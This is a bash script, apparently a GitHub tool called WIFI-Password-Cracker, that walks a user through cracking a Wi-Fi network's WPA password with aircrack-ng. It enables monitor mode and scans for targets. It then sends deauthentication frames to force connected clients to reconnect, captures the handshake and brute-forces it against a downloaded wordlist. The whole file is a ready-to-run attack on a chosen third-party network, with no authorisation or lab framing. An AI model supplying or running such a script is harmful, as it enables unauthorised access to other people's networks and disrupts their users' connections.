#!/bin/bash
start() {
    iwconfig
    echo -n "Paste wifi interface name that has (mode:managed or monitor): "
    read wifi_interface
}

wlan_monitor() {
    # enabeling wifi interface for monitoring
    sudo airmon-ng start $wifi_interface

    sudo airmon-ng check kill

    clear

    sudo airmon-ng

    echo -n "Paste new wifi interface name: "
    read wifi_interface

    sudo airmon-ng start $wifi_interface
}

wlan_crack() {

    clear

    echo "please wait for 15s while scanning for networks"
    sleep 3

    # Scans for wifi networks:
    sudo timeout 15 airodump-ng $wifi_interface

    echo
    echo "if nothing showed up, watch this video: https://www.youtube.com/watch?v=m2s0JxkJcOg"
    echo

    echo -n "Paste the CH of the wifi target: "
    read ch_wifi
    echo -n "Paste the BSSID of the wifi target: "
    read bssid_wifi
    echo -n "Enter the path to save the capture files of the wifi target: (ex. /home/user/Desktop/<wifi-name>) "
    read path_wifi

    clear

    echo "Please copy the WiFi target's station with the highest frames from the newly opened terminal then return here to paste it."
    echo
    echo "1- First there must be users connected to the wifi target"
    echo "2- wait for 30s for frames to increase"
    sleep 6

    # collecting authentication handshake in a new terminal
    gnome-terminal -x sudo airodump-ng -c $ch_wifi --bssid $bssid_wifi -w $path_wifi $wifi_interface >/dev/null
    # please note that there must be users connected to that wifi first otherwise there won't be any stations
    echo

    echo -n "Paste the WiFi target's station: "
    read station_wifi
    echo

    # inject frames for the purbose of creating artificial traffic to be used for WEP aircracking.
    sudo aireplay-ng -0 2 -a $bssid_wifi -c $station_wifi $wifi_interface
    echo
}

pass_cap_crack() {
    echo "You'll need a password dictionary to crack the wifi target, if you don't have one download it from here: https://bit.ly/3bt6Ooe_password_list"
    echo

    echo -n "Enter the path of the wordlist dictionary: (ex. /home/user/Desktop/rockyou.txt) "
    read word_list
    echo -n "Copy & paste the path of .cap file inside $path_wifi: "
    read cap_file
    echo

    # brute force targeted wifi with aircrack using password list file and the capture handshaek (.cap) file
    sudo aircrack-ng -a2 -b $bssid_wifi -w $word_list $cap_file

    echo Made By Osama-Yusuf
    echo My Linkedin: https://www.linkedin.com/in/osama--youssef/
    echo GitHub Repo: https://github.com/Osama-Yusuf/WIFI-Password-Cracker
}

master() {
    wlpa="/sys/class/net"

    # Check if the wifi interface is eneabled for monitoring
    # Then just execute (start) & (wlan_crack) & (pass_cap_crack) functions.

    # And if it the monitor mode is not enabled
    # Execute every function

    # Note: when monitor mode is enabled wifi interface change it's name to either wlan0 or wlan0mon and it exist as folder in "/sys/class/net"
    # So i check if it's enabled by checking the folder if it has any folder that start with waln

    if (ls $wlpa | grep wlan*); then
        # echo your wifi interface folder exist.
        # if it's eneabled then just execute (start) & (wlan_crack) & (pass_cap_crack) functions.
        start
        wlan_crack
        pass_cap_crack
    else
        # echo your wifi interface folder doesn't exist.
        start
        wlan_monitor
        wlan_crack
        pass_cap_crack
    fi
}

sub_master() {
    # echo -n "Do you have a ready .cap file? (y/n): "; read answer_cap
    read -p "Do you have a ready .cap file? (y/n): " answer_cap

    if [ $answer_cap == "y" ]; then
        echo
        echo -n "Paste the BSSID of the wifi target: "
        read bssid_wifi
        echo
        pass_cap_crack
    elif [ $answer_cap == "n" ]; then
        master
    else
        echo "Invalid input, Please enter y or n"
        sub_master
    fi
}

check_aircrack() {
    if (ls /bin | grep "aircrack-ng" >/dev/null); then
        echo "Good, aircrack-ng is installed lets's move on the next step"
        echo
        sub_master
    else
        read -p "Aircrack is not installed, Do you want to install it? (y/n): " answer_aircrack
        if [ $answer_aircrack == "y" ]; then
            sudo apt-get install aircrack-ng
            sub_master
        elif [ $answer_aircrack == "n" ]; then
            echo "Please install aircrack-ng and try again"
            exit 1
        else
            echo "Invalid input, Please enter y or n"
            check_aircrack
        fi
    fi
}
check_aircrack

# Made by Osama-Yusuf
# GitHub Repo: https://github.com/Osama-Yusuf/WIFI-Password-Cracker
# My Linkedin: https://www.linkedin.com/in/osama--youssef/
